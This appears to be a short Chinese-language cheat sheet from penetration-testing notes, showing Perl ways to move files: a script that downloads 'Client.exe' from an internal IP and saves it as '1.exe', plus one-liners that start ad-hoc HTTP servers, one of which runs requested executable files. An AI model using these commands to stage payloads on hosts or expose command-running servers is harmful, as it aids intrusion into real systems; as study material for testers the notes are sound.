方式一：
```perl
	#!/usr/bin/perl 
	use LWP::Simple; 
	getstore("http://192.168.1.192/Client.exe", "1.exe");

```

	执行：perl test.pl

方式二：
搭建服务器
```perl
perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>1337); $s->mount("/"=>{path=>"."}); $s->start'  
perl -MIO::All -e 'io(":8080")->fork->accept->(sub { $_[0] < io(-x $1 +? "./$1 |" : $1) if /^GET \/(.*) / })'
```